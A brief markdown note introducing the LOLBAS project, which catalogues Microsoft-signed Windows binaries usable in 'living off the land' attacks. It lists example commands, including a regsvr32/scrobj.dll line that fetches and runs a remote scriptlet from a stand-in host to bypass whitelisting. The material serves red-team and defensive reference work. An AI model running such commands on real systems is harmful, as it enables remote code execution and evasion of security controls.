# LOLBAS

Living Off The Land Binaries and Scripts (and also Libraries) : [https://lolbas-project.github.io/](https://lolbas-project.github.io)

> The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.

A LOLBin/Lib/Script must:

* Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft. Have extra "unexpected" functionality. It is not interesting to document intended use cases. Exceptions are application whitelisting bypasses
* Have functionality that would be useful to an APT or red team

```bash
wmic.exe process call create calc
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
Microsoft.Workflow.Compiler.exe tests.xml results.xml
```
